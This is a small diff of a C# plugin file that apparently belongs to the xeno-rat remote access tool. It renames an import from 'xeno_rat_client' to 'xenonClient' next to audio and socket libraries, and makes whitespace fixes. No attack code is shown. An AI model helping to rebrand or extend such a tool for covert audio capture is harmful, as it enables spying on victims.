@@ -1,9 +1,9 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using xeno_rat_client;
+using xenonClient;
 using NAudio.Wave;
 using System.Threading;
 using System.Net.Sockets;
@@ -111,3 +111,4 @@ namespace Plugin
     }
 
 }
+
